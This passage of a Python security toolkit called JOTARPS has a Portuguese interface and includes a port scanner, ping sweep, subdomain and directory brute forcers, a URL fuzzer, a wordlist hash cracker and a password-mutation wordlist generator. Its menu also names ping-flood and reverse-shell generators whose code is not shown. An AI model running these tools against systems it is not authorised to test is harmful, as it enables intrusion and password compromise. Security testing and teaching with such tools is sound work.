#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" JOTARPS - Cybersecurity Toolkit by jpp v1.0.0 """

import os
import sys
import time
import socket
import struct
import ipaddress
import subprocess
import threading
import hashlib
import base64
import random
import string
import re
import json
import urllib.request
import urllib.parse
import urllib.error
import http.client
import ssl
import platform
import getpass
import shutil
from datetime import datetime

# ----------------------------------------------
# COLORS
# ----------------------------------------------
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    PURPLE  = "\033[95m"
    CYAN    = "\033[96m"
    BLUE    = "\033[94m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    RED     = "\033[91m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"
    BG_PRP  = "\033[45m"
    BG_BLK  = "\033[40m"

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def cprint(text, color=C.WHITE, end="\n"):
    print(f"{color}{text}{C.RESET}", end=end)

def banner():
    clr()
    logo = [
        r" ___  ___  _____  ___  ____  ____  ___  ",
        r"/  / /  / /  __/ /  / /   / /  _/ /  _\ ",
        r"/  /_/  / /  __/ /  /_/  /  /  /  /  __/",
        r"\____\_/  \____/ \____\_/   \__/  \___/  ",
    ]
    # J
    J = [
        r"   ____  ",
        r"  /    \ ",
        r" /  __  |",
        r"|  /  | |",
        r" \_\__/_/",
    ]
    # O
    O = [
        r"  ____  ",
        r" /    \ ",
        r"|  ()  |",
        r" \    / ",
        r"  \__/  ",
    ]
    # T
    T = [
        r" _______ ",
        r"|__   __|",
        r"   | |   ",
        r"   | |   ",
        r"   |_|   ",
    ]
    # A
    A = [
        r"   /\   ",
        r"  /  \  ",
        r" / /\ \ ",
        "/_/  \\_\\",
        r"        ",
    ]
    # R
    R = [
        r" ____  ",
        r"|  _ \ ",
        r"| |_) |",
        r"|  _ < ",
        "|_| \\_\\",
    ]
    # P
    P = [
        r" ____  ",
        r"|  _ \ ",
        r"| |_) |",
        r"|  __/ ",
        r"|_|    ",
    ]
    # S
    S = [
        r" _____ ",
        r"/ ____|",
        r"\___ \ ",
        r" ___) |",
        r"|____/ ",
    ]

    letters = [J, O, T, A, R, P, S]
    for row in range(5):
        line = "  "
        for letter in letters:
            line += letter[row] + " "
        print(f"{C.PURPLE}{C.BOLD}{line}{C.RESET}")

    print()
    print(f"{C.PURPLE}{'='*58}{C.RESET}")
    print(f"{C.PURPLE}  [*] Cybersecurity Toolkit   |   by jpp   |   v1.0.0{C.RESET}")
    print(f"{C.PURPLE}{'='*58}{C.RESET}\n")

def menu():
    banner()

    # Grade horizontal: 3 colunas
    items = [
        (" 1", "Port Scanner TCP"),
        (" 2", "Ping Sweep"),
        (" 3", "Traceroute"),
        (" 4", "DNS Lookup"),
        (" 5", "WHOIS Manual"),
        (" 6", "Banner Grabber"),
        (" 7", "HTTP Headers"),
        (" 8", "Subnet Calc"),
        (" 9", "Subdomain Finder"),
        ("10", "Dir Brute Force"),
        ("11", "URL Fuzzer"),
        ("12", "Tech Fingerprint"),
        ("13", "Link Extractor"),
        ("14", "Hash Generator"),
        ("15", "Hash Cracker"),
        ("16", "Base64"),
        ("17", "ROT13"),
        ("18", "XOR Cipher"),
        ("19", "Caesar Cipher"),
        ("20", "Password Gen"),
        ("21", "Wordlist Gen"),
        ("22", "Pass Strength"),
        ("23", "Leet Speak"),
        ("24", "System Info"),
        ("25", "Public IP"),
        ("26", "MAC Lookup"),
        ("27", "File Analyzer"),
        ("28", "Active Conns"),
        ("29", "Payload B64"),
        ("30", "IP Geolocation"),
        ("31", "Ping Flood"),
        ("32", "Rev Shell Gen"),
        ("33", "URL Encoder"),
        ("34", "JWT Decoder"),
        ("35", "EXIT"),
    ]

    cols = 3
    col_w = 22

    sections = [
        ("REDE & SCAN",        range(0,  8)),
        ("ANALISE DE WEB",     range(8,  13)),
        ("CRIPTO & HASH",      range(13, 19)),
        ("SENHAS & WORDLIST",  range(19, 23)),
        ("FORENSE & INFO",     range(23, 28)),
        ("MISC & TOOLS",       range(28, 35)),
    ]

    for sec_name, sec_range in sections:
        print(f"  {C.PURPLE}{C.BOLD}[ {sec_name} ]{C.RESET}")
        sec_items = [items[i] for i in sec_range]
        for i in range(0, len(sec_items), cols):
            row_items = sec_items[i:i+cols]
            line = "  "
            for num, name in row_items:
                cell = f"{C.PURPLE}[{C.WHITE}{num}{C.PURPLE}]{C.RESET} {C.WHITE}{name}{C.RESET}"
                # pad para alinhar (conta so chars visiveis)
                pad = col_w - len(name) - 4
                line += cell + " " * max(pad, 1)
            print(line)
        print()

    print(f"{C.PURPLE}{'='*58}{C.RESET}")
    choice = input(f"  {C.PURPLE}jotarps{C.RESET}{C.GRAY}@{C.RESET}{C.PURPLE}menu{C.RESET} {C.WHITE}> {C.RESET}").strip()
    return choice

def pause():
    input(f"\n  {C.GRAY}[ pressione ENTER para voltar ]{C.RESET}")

def sep():
    print(f"\n{C.PURPLE}{'-'*55}{C.RESET}\n")

# ----------------------------------------------
# 1 - PORT SCANNER TCP
# ----------------------------------------------
def port_scanner():
    banner()
    cprint("  == PORT SCANNER TCP ==\n", C.PURPLE + C.BOLD)
    host = input(f"  {C.CYAN}Host/IP{C.RESET}: ").strip()
    port_range = input(f"  {C.CYAN}Range de portas (ex: 1-1024){C.RESET}: ").strip()
    try:
        start, end = map(int, port_range.split("-"))
    except:
        cprint("  [!] Formato inválido. Use: 1-1024", C.RED)
        pause(); return

    try:
        target_ip = socket.gethostbyname(host)
    except socket.gaierror:
        cprint(f"  [!] Host inválido: {host}", C.RED)
        pause(); return

    sep()
    cprint(f"  [*] Escaneando {C.YELLOW}{target_ip}{C.RESET}{C.GREEN} ({start}-{end}){C.RESET}", C.GREEN)
    open_ports = []
    start_time = time.time()

    def scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            r = s.connect_ex((target_ip, port))
            if r == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "desconhecido"
                open_ports.append((port, service))
                cprint(f"  {C.GREEN}[ABERTA]{C.RESET}  Porta {C.YELLOW}{port}{C.RESET}  ({service})")
            s.close()
        except:
            pass

    threads = []
    for p in range(start, end + 1):
        t = threading.Thread(target=scan, args=(p,))
        threads.append(t)
        t.start()
        if len(threads) >= 200:
            for th in threads: th.join()
            threads = []
    for th in threads: th.join()

    elapsed = round(time.time() - start_time, 2)
    sep()
    cprint(f"  [OK] {len(open_ports)} porta(s) abertas | Tempo: {elapsed}s", C.CYAN)
    pause()

# ----------------------------------------------
# 2 - PING SWEEP
# ----------------------------------------------
def ping_sweep():
    banner()
    cprint("  == PING SWEEP / HOST DISCOVERY ==\n", C.PURPLE + C.BOLD)
    net = input(f"  {C.CYAN}Rede CIDR (ex: 192.168.1.0/24){C.RESET}: ").strip()
    try:
        network = ipaddress.ip_network(net, strict=False)
    except ValueError:
        cprint("  [!] Rede inválida.", C.RED); pause(); return

    alive = []
    sep()
    cprint(f"  [*] Varrendo {net} ...\n", C.GREEN)

    def do_ping(ip):
        param = "-n" if platform.system().lower() == "windows" else "-c"
        cmd = ["ping", param, "1", "-W", "1", str(ip)]
        try:
            r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            if r.returncode == 0:
                alive.append(str(ip))
                cprint(f"  {C.GREEN}[UP]{C.RESET}  {ip}", C.WHITE)
        except:
            pass

    threads = []
    for host in list(network.hosts())[:254]:
        t = threading.Thread(target=do_ping, args=(host,))
        threads.append(t); t.start()
        if len(threads) >= 50:
            for th in threads: th.join()
            threads = []
    for th in threads: th.join()

    sep()
    cprint(f"  [OK] {len(alive)} host(s) online.", C.CYAN)
    pause()

# ----------------------------------------------
# 3 - TRACEROUTE
# ----------------------------------------------
def traceroute():
    banner()
    cprint("  == TRACEROUTE ==\n", C.PURPLE + C.BOLD)
    host = input(f"  {C.CYAN}Host/IP{C.RESET}: ").strip()
    cmd = ["tracert", host] if platform.system().lower() == "windows" else ["traceroute", "-m", "30", host]
    sep()
    cprint(f"  [*] Rastreando rota para {host}...\n", C.GREEN)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(C.WHITE + proc.stdout + C.RESET)
    except FileNotFoundError:
        cprint("  [!] traceroute não encontrado. Instale com: pkg install traceroute", C.RED)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 4 - DNS LOOKUP
# ----------------------------------------------
def dns_lookup():
    banner()
    cprint("  == DNS LOOKUP & REVERSO ==\n", C.PURPLE + C.BOLD)
    target = input(f"  {C.CYAN}Domínio ou IP{C.RESET}: ").strip()
    sep()
    try:
        ip = socket.gethostbyname(target)
        cprint(f"  {C.GREEN}IPv4:{C.RESET}       {ip}")
    except:
        cprint(f"  [!] Resolução IPv4 falhou.", C.RED)
    try:
        infos = socket.getaddrinfo(target, None)
        ipv6s = set(i[4][0] for i in infos if i[0] == socket.AF_INET6)
        for v6 in ipv6s:
            cprint(f"  {C.GREEN}IPv6:{C.RESET}       {v6}")
    except:
        pass
    try:
        rev = socket.gethostbyaddr(target)
        cprint(f"  {C.GREEN}Reverso:{C.RESET}    {rev[0]}")
    except:
        cprint(f"  {C.YELLOW}Reverso:{C.RESET}    não encontrado")
    pause()

# ----------------------------------------------
# 5 - WHOIS MANUAL
# ----------------------------------------------
def whois_lookup():
    banner()
    cprint("  == WHOIS MANUAL ==\n", C.PURPLE + C.BOLD)
    domain = input(f"  {C.CYAN}Domínio (ex: google.com){C.RESET}: ").strip()
    sep()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(("whois.iana.org", 43))
        s.send((domain + "\r\n").encode())
        resp = b""
        while True:
            data = s.recv(4096)
            if not data: break
            resp += data
        s.close()
        refer = None
        for line in resp.decode(errors="ignore").splitlines():
            if line.lower().startswith("refer:"):
                refer = line.split(":", 1)[1].strip()
                break
        server = refer if refer else "whois.verisign-grs.com"
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.settimeout(10)
        s2.connect((server, 43))
        s2.send((domain + "\r\n").encode())
        resp2 = b""
        while True:
            data = s2.recv(4096)
            if not data: break
            resp2 += data
        s2.close()
        print(C.WHITE + resp2.decode(errors="ignore")[:3000] + C.RESET)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 6 - BANNER GRABBER
# ----------------------------------------------
def banner_grabber():
    banner()
    cprint("  == BANNER GRABBER ==\n", C.PURPLE + C.BOLD)
    host = input(f"  {C.CYAN}Host/IP{C.RESET}: ").strip()
    ports_raw = input(f"  {C.CYAN}Portas (ex: 21,22,80,443){C.RESET}: ").strip()
    ports = [int(p.strip()) for p in ports_raw.split(",") if p.strip().isdigit()]
    sep()
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((host, port))
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner_data = s.recv(1024).decode(errors="ignore").strip()
            s.close()
            cprint(f"  {C.YELLOW}[{port}]{C.RESET} {banner_data[:200]}")
        except Exception as e:
            cprint(f"  {C.RED}[{port}]{C.RESET} {e}")
    pause()

# ----------------------------------------------
# 7 - HTTP HEADER INSPECTOR
# ----------------------------------------------
def http_headers():
    banner()
    cprint("  == HTTP HEADER INSPECTOR ==\n", C.PURPLE + C.BOLD)
    url = input(f"  {C.CYAN}URL (ex: https://example.com){C.RESET}: ").strip()
    sep()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "JOTARPS/1.0"})
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            cprint(f"  {C.GREEN}Status:{C.RESET} {r.status}", C.WHITE)
            for k, v in r.headers.items():
                color = C.YELLOW if k.lower() in ["server","x-powered-by","x-frame-options","content-security-policy"] else C.WHITE
                cprint(f"  {C.CYAN}{k}:{C.RESET} {v}", color)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 8 - SUBNET CALCULATOR
# ----------------------------------------------
def subnet_calc():
    banner()
    cprint("  == SUBNET CALCULATOR ==\n", C.PURPLE + C.BOLD)
    cidr = input(f"  {C.CYAN}CIDR (ex: 192.168.1.0/24){C.RESET}: ").strip()
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        sep()
        cprint(f"  Rede:           {net.network_address}")
        cprint(f"  Broadcast:      {net.broadcast_address}")
        cprint(f"  Máscara:        {net.netmask}")
        cprint(f"  Máscara Wild:   {net.hostmask}")
        cprint(f"  Hosts válidos:  {net.num_addresses - 2}")
        cprint(f"  Primeiro host:  {list(net.hosts())[0] if net.num_addresses > 2 else 'N/A'}")
        cprint(f"  Último host:    {list(net.hosts())[-1] if net.num_addresses > 2 else 'N/A'}")
        cprint(f"  Versão IP:      IPv{net.version}")
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 9 - SUBDOMAIN FINDER
# ----------------------------------------------
def subdomain_finder():
    banner()
    cprint("  == SUBDOMÍNIO FINDER ==\n", C.PURPLE + C.BOLD)
    domain = input(f"  {C.CYAN}Domínio alvo (ex: example.com){C.RESET}: ").strip()
    wordlist_input = input(f"  {C.CYAN}Wordlist (ENTER para padrão){C.RESET}: ").strip()
    default_words = ["www","mail","ftp","admin","api","dev","test","staging","blog",
                     "shop","store","portal","vpn","remote","cdn","static","assets",
                     "images","beta","app","dashboard","panel","login","secure","mx"]
    if wordlist_input and os.path.exists(wordlist_input):
        with open(wordlist_input) as f:
            words = [l.strip() for l in f if l.strip()]
    else:
        words = default_words
    sep()
    cprint(f"  [*] Testando {len(words)} subdomínios em {domain}...\n", C.GREEN)
    found = []
    def check(sub):
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            found.append((full, ip))
            cprint(f"  {C.GREEN}[OK]{C.RESET}  {full:<40} {C.YELLOW}{ip}{C.RESET}")
        except:
            pass
    threads = []
    for w in words:
        t = threading.Thread(target=check, args=(w,))
        threads.append(t); t.start()
    for t in threads: t.join()
    sep()
    cprint(f"  [OK] {len(found)} subdomínio(s) encontrado(s).", C.CYAN)
    pause()

# ----------------------------------------------
# 10 - DIRECTORY BRUTE FORCE
# ----------------------------------------------
def dir_bruteforce():
    banner()
    cprint("  == DIRECTORY BRUTE FORCE ==\n", C.PURPLE + C.BOLD)
    url = input(f"  {C.CYAN}URL base (ex: http://site.com){C.RESET}: ").strip().rstrip("/")
    wordlist_input = input(f"  {C.CYAN}Wordlist (ENTER para padrão){C.RESET}: ").strip()
    default = ["admin","login","dashboard","panel","wp-admin","phpmyadmin","api",
               "config","backup","db","database","test","dev","static","uploads",
               "files","images","css","js","robots.txt",".git","secret","hidden"]
    if wordlist_input and os.path.exists(wordlist_input):
        with open(wordlist_input) as f:
            words = [l.strip() for l in f if l.strip()]
    else:
        words = default
    sep()
    cprint(f"  [*] Fuzzing {url} ({len(words)} paths)...\n", C.GREEN)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    lock = threading.Lock()
    def check(path):
        full = f"{url}/{path}"
        try:
            req = urllib.request.Request(full, headers={"User-Agent": "JOTARPS/1.0"})
            with urllib.request.urlopen(req, context=ctx, timeout=5) as r:
                code = r.status
                color = C.GREEN if code == 200 else C.YELLOW
                with lock:
                    cprint(f"  {color}[{code}]{C.RESET}  {full}")
        except urllib.error.HTTPError as e:
            if e.code not in [404]:
                with lock:
                    cprint(f"  {C.GRAY}[{e.code}]{C.RESET}  {full}")
        except:
            pass
    threads = []
    for w in words:
        t = threading.Thread(target=check, args=(w,))
        threads.append(t); t.start()
        if len(threads) >= 30:
            for th in threads: th.join()
            threads = []
    for th in threads: th.join()
    sep()
    cprint(f"  [OK] Scan completo.", C.CYAN)
    pause()

# ----------------------------------------------
# 11 - URL FUZZER
# ----------------------------------------------
def url_fuzzer():
    banner()
    cprint("  == URL FUZZER ==\n", C.PURPLE + C.BOLD)
    url = input(f"  {C.CYAN}URL com FUZZ (ex: http://site.com/page?id=FUZZ){C.RESET}: ").strip()
    fuzz_type = input(f"  {C.CYAN}Tipo [1=números 2=wordlist]{C.RESET}: ").strip()
    sep()
    cprint(f"  [*] Iniciando fuzzing...\n", C.GREEN)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    payloads = []
    if fuzz_type == "1":
        r_input = input(f"  {C.CYAN}Range (ex: 1-100){C.RESET}: ").strip()
        try:
            s, e = map(int, r_input.split("-"))
            payloads = [str(i) for i in range(s, e+1)]
        except:
            cprint("  [!] Range inválido.", C.RED); pause(); return
    else:
        wp = input(f"  {C.CYAN}Caminho da wordlist{C.RESET}: ").strip()
        if os.path.exists(wp):
            with open(wp) as f:
                payloads = [l.strip() for l in f if l.strip()]
        else:
            cprint("  [!] Arquivo não encontrado.", C.RED); pause(); return
    for p in payloads[:200]:
        target = url.replace("FUZZ", urllib.parse.quote(str(p)))
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "JOTARPS/1.0"})
            with urllib.request.urlopen(req, context=ctx, timeout=5) as r:
                cprint(f"  {C.GREEN}[{r.status}]{C.RESET}  {target}")
        except urllib.error.HTTPError as e:
            if e.code != 404:
                cprint(f"  {C.YELLOW}[{e.code}]{C.RESET}  {target}")
        except:
            pass
    sep()
    cprint(f"  [OK] Fuzzing finalizado.", C.CYAN)
    pause()

# ----------------------------------------------
# 12 - TECH FINGERPRINTER
# ----------------------------------------------
def tech_fingerprint():
    banner()
    cprint("  == TECH FINGERPRINTER ==\n", C.PURPLE + C.BOLD)
    url = input(f"  {C.CYAN}URL{C.RESET}: ").strip()
    sep()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    sigs = {
        "WordPress":  ["wp-content","wp-includes","wordpress"],
        "Joomla":     ["joomla","option=com_"],
        "Drupal":     ["drupal","sites/default"],
        "Laravel":    ["laravel","csrf-token"],
        "Django":     ["csrfmiddlewaretoken","django"],
        "React":      ["react.js","react.min.js","__reactFiber"],
        "Vue.js":     ["vue.js","vue.min.js","__vue__"],
        "Angular":    ["angular.js","ng-version"],
        "jQuery":     ["jquery.min.js","jquery.js"],
        "Bootstrap":  ["bootstrap.min.css","bootstrap.css"],
        "PHP":        ["x-powered-by: php","set-cookie: phpsessid"],
        "ASP.NET":    ["x-powered-by: asp","__viewstate"],
        "Nginx":      ["server: nginx"],
        "Apache":     ["server: apache"],
        "Cloudflare": ["cloudflare","cf-ray"],
    }
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "JOTARPS/1.0"})
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            body = r.read(20000).decode(errors="ignore").lower()
            headers_raw = str(r.headers).lower()
            combined = body + headers_raw
            cprint(f"  {C.GREEN}Status:{C.RESET} {r.status}\n")
            found_any = False
            for tech, patterns in sigs.items():
                for p in patterns:
                    if p.lower() in combined:
                        cprint(f"  {C.GREEN}[OK]{C.RESET}  {C.YELLOW}{tech}{C.RESET} detectado")
                        found_any = True
                        break
            if not found_any:
                cprint("  [~] Nenhuma tecnologia identificada pelos padrões.", C.GRAY)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 13 - EXTRATOR DE LINKS
# ----------------------------------------------
def link_extractor():
    banner()
    cprint("  == EXTRATOR DE LINKS ==\n", C.PURPLE + C.BOLD)
    url = input(f"  {C.CYAN}URL{C.RESET}: ").strip()
    sep()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "JOTARPS/1.0"})
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            body = r.read(50000).decode(errors="ignore")
        links = re.findall(r'href=["\']([^"\']+)["\']', body)
        links += re.findall(r'src=["\']([^"\']+)["\']', body)
        links = sorted(set(links))
        for l in links:
            cprint(f"  {C.CYAN}->{C.RESET}  {l}")
        sep()
        cprint(f"  [OK] {len(links)} link(s) encontrado(s).", C.GREEN)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 14 - GERADOR DE HASH
# ----------------------------------------------
def hash_generator():
    banner()
    cprint("  == GERADOR DE HASH ==\n", C.PURPLE + C.BOLD)
    text = input(f"  {C.CYAN}Texto ou caminho de arquivo{C.RESET}: ").strip()
    if os.path.isfile(text):
        with open(text, "rb") as f:
            data = f.read()
        cprint(f"\n  {C.GREEN}Arquivo:{C.RESET} {text}")
    else:
        data = text.encode()
        cprint(f"\n  {C.GREEN}Texto:{C.RESET} {text}")
    sep()
    algos = ["md5","sha1","sha224","sha256","sha384","sha512","sha3_256","blake2b"]
    for algo in algos:
        h = hashlib.new(algo, data).hexdigest()
        cprint(f"  {C.YELLOW}{algo.upper():<12}{C.RESET}  {h}")
    pause()

# ----------------------------------------------
# 15 - HASH CRACKER
# ----------------------------------------------
def hash_cracker():
    banner()
    cprint("  == HASH CRACKER (WORDLIST) ==\n", C.PURPLE + C.BOLD)
    target = input(f"  {C.CYAN}Hash alvo{C.RESET}: ").strip().lower()
    algo   = input(f"  {C.CYAN}Algoritmo (md5/sha1/sha256){C.RESET}: ").strip().lower()
    wpath  = input(f"  {C.CYAN}Caminho da wordlist{C.RESET}: ").strip()
    if not os.path.exists(wpath):
        cprint("  [!] Wordlist não encontrada.", C.RED); pause(); return
    sep()
    cprint(f"  [*] Crackeando hash {algo.upper()}...\n", C.GREEN)
    try:
        with open(wpath, "r", errors="ignore") as f:
            for i, word in enumerate(f):
                word = word.strip()
                try:
                    h = hashlib.new(algo, word.encode()).hexdigest()
                except:
                    cprint(f"  [!] Algoritmo inválido: {algo}", C.RED); pause(); return
                if h == target:
                    cprint(f"\n  {C.GREEN}[OK] ENCONTRADO!{C.RESET}  {C.YELLOW}{word}{C.RESET}")
                    pause(); return
                if i % 5000 == 0 and i > 0:
                    cprint(f"  [~] {i} tentativas...", C.GRAY)
        cprint(f"\n  {C.RED}[X] Hash não crackeado na wordlist.", C.RED)
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 16 - BASE64
# ----------------------------------------------
def base64_tool():
    banner()
    cprint("  == ENCODER/DECODER BASE64 ==\n", C.PURPLE + C.BOLD)
    mode = input(f"  {C.CYAN}[1] Encode  [2] Decode{C.RESET}: ").strip()
    text = input(f"  {C.CYAN}Texto{C.RESET}: ").strip()
    sep()
    try:
        if mode == "1":
            result = base64.b64encode(text.encode()).decode()
            cprint(f"  {C.GREEN}Encoded:{C.RESET}\n  {result}")
        else:
            result = base64.b64decode(text.encode()).decode(errors="replace")
            cprint(f"  {C.GREEN}Decoded:{C.RESET}\n  {result}")
    except Exception as e:
        cprint(f"  [!] Erro: {e}", C.RED)
    pause()

# ----------------------------------------------
# 17 - ROT13
# ----------------------------------------------
def rot13_tool():
    banner()
    cprint("  == ROT13 CIPHER ==\n", C.PURPLE + C.BOLD)
    text = input(f"  {C.CYAN}Texto{C.RESET}: ").strip()
    result = text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
    sep()
    cprint(f"  {C.GREEN}ROT13:{C.RESET}  {result}")
    pause()

# ----------------------------------------------
# 18 - XOR CIPHER
# ----------------------------------------------
def xor_cipher():
    banner()
    cprint("  == XOR CIPHER ==\n", C.PURPLE + C.BOLD)
    text = input(f"  {C.CYAN}Texto{C.RESET}: ").strip()
    key  = input(f"  {C.CYAN}Chave (string){C.RESET}: ").strip()
    sep()
    result = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
    hex_out = " ".join(f"{ord(c):02x}" for c in result)
    cprint(f"  {C.GREEN}XOR Hex:{C.RESET}  {hex_out}")
    b64_out = base64.b64encode(result.encode(errors="replace")).decode()
    cprint(f"  {C.GREEN}Base64: {C.RESET}  {b64_out}")
    pause()

# ----------------------------------------------
# 19 - CAESAR CIPHER
# ----------------------------------------------
def caesar_cipher():
    banner()
    cprint("  == CAESAR CIPHER ==\n", C.PURPLE + C.BOLD)
    text   = input(f"  {C.CYAN}Texto{C.RESET}: ").strip()
    shift  = input(f"  {C.CYAN}Shift (ex: 3){C.RESET}: ").strip()
    mode   = input(f"  {C.CYAN}[1] Encriptar  [2] Decriptar  [3] Brute Force{C.RESET}: ").strip()
    sep()
    def shift_text(t, n):
        r = ""
        for c in t:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                r += chr((ord(c) - base + n) % 26 + base)
            else:
                r += c
        return r
    try:
        s = int(shift)
    except:
        s = 3
    if mode == "1":
        cprint(f"  {C.GREEN}Cifrado:{C.RESET}  {shift_text(text, s)}")
    elif mode == "2":
        cprint(f"  {C.GREEN}Decifrado:{C.RESET}  {shift_text(text, -s)}")
    else:
        cprint(f"  {C.YELLOW}== Brute Force =={C.RESET}")
        for i in range(1, 26):
            cprint(f"  {C.CYAN}[{i:2d}]{C.RESET}  {shift_text(text, i)}")
    pause()

# ----------------------------------------------
# 20 - GERADOR DE SENHAS
# ----------------------------------------------
def password_gen():
    banner()
    cprint("  == GERADOR DE SENHAS FORTES ==\n", C.PURPLE + C.BOLD)
    length  = input(f"  {C.CYAN}Tamanho (padrão 20){C.RESET}: ").strip()
    count   = input(f"  {C.CYAN}Quantidade (padrão 10){C.RESET}: ").strip()
    use_sym = input(f"  {C.CYAN}Incluir símbolos? [s/n]{C.RESET}: ").strip().lower()
    length  = int(length) if length.isdigit() else 20
    count   = int(count)  if count.isdigit()  else 10
    chars   = string.ascii_letters + string.digits
    if use_sym == "s":
        chars += "!@#$%^&*()-_=+[]{}|;:,.<>?"
    sep()
    for i in range(count):
        pwd = "".join(random.SystemRandom().choice(chars) for _ in range(length))
        cprint(f"  {C.YELLOW}[{i+1:2d}]{C.RESET}  {pwd}")
    pause()

# ----------------------------------------------
# 21 - GERADOR DE WORDLIST
# ----------------------------------------------
def wordlist_gen():
    banner()
    cprint("  == GERADOR DE WORDLIST ==\n", C.PURPLE + C.BOLD)
    base   = input(f"  {C.CYAN}Palavra base{C.RESET}: ").strip()
    year   = input(f"  {C.CYAN}Ano (ex: 2024){C.RESET}: ").strip()
    extra  = input(f"  {C.CYAN}Extras separados por vírgula (ex: 123,!,@){C.RESET}: ").strip()
    output = input(f"  {C.CYAN}Arquivo de saída (ex: wordlist.txt){C.RESET}: ").strip() or "wordlist.txt"
    extras = [e.strip() for e in extra.split(",") if e.strip()]
    sep()
    words = set()
    mutations = [base, base.lower(), base.upper(), base.capitalize(),
                 base + year, base.lower() + year, base + "123", base + "!",
                 base + "@", base + "#", "123" + base, year + base]
    for m in mutations:
        words.add(m)
        for e in extras:
            words.add(m + e)
            words.add(e + m)
    leet = str.maketrans("aAeEiIoOsStT","4433110055++")
    for w in list(words)[:]:
        words.add(w.translate(leet))
    with open(output, "w") as f:
        for w in sorted(words):
            f.write(w + "\n")
    cprint(f"  {C.GREEN}[OK]{C.RESET} {len(words)} palavras salvas em {C.YELLOW}{output}{C.RESET}")
    pause()

# ----------------------------------------------
# 22 - VERIFICADOR DE FORÇA DE SENHA
# ----------------------------------------------
def password_strength():
    banner()
    cprint("  == VERIFICADOR DE FORÇA DE SENHA ==\n", C.PURPLE + C.BOLD)
    pwd = getpass.getpass(f"  {C.CYAN}Senha (oculta){C.RESET}: ")
    sep()
    score = 0
    checks = [
        (len(pwd) >= 8,  "Mínimo 8 caracteres"),
        (len(pwd) >= 12, "Mínimo 12 caracteres"),
        (len(pwd) >= 16, "Mínimo 16 caracteres"),
        (any(c.isupper() for c in pwd), "Letra maiúscula"),
        (any(c.islower() for c in pwd), "Letra minúscula"),
        (any(c.isdigit() for c in pwd), "Número"),
        (any(c in "!@#$%^&*()-_=+[]{}|;:,.<>?" for c in pwd), "Símbolo especial"),
        (len(set(pwd)) > len(pwd) * 0.6, "Alta diversidade de caracteres"),
        (not re.search(r"(.)\1{2,}", pwd), "Sem repetições consecutivas"),
    ]
    for ok, desc in checks:
        icon  = f"{C.GREEN}[OK]" if ok else f"{C.RED}[X]"
        cprint(f"  {icon}{C.RESET}  {desc}")
        score += ok
    sep()
    level = (
        (C.RED,    "MUITO FRACA") if score <= 3 else
        (C.YELLOW, "FRACA")       if score <= 5 else
        (C.CYAN,   "MÉDIA")       if score <= 7 else
        (C.GREEN,  "FORTE")
    )
    cprint(f"  Força: {level[0]}{C.BOLD}{level[1]}{C.RESET}  ({score}/{len(checks)})")
    pause()

# ----------------------------------------------
# 23 - MUTAÇÃO LEET SPEAK
# ----------------------------------------------
def leet_mutator():
    banner()
    cprint("  == MUTAÇÃO LEET SPEAK ==\n", C.PURPLE + C.BOLD)
    word = input(f"  {C.CYAN}Palavra{C.RESET}: ").strip()
    sep()
    maps = [
        {"a":"4","e":"3","i":"1","o":"0","s":"5","t":"7"},
        {"a":"@","e":"3","i":"!","o":"0","s":"$","t":"+"},
        {"a":"4","e":"","i":"|","o":"()","s":"","t":""},
    ]
    for i, m in enumerate(maps, 1):
        result = word
        for k, v in m.items():
            result = result.replace(k, v).replace(k.upper(), v.upper())
        cprint(f"  {C.YELLOW}[Estilo {i}]{C.RESET}  {result}")
    pause()

# ----------------------------------------------
# 24 - INFO DO SISTEMA
# ----------------------------------------------
def sys_info():
    banner()
    cprint("  == INFO DO SISTEMA LOCAL ==\n", C.PURPLE + C.BOLD)
    sep()
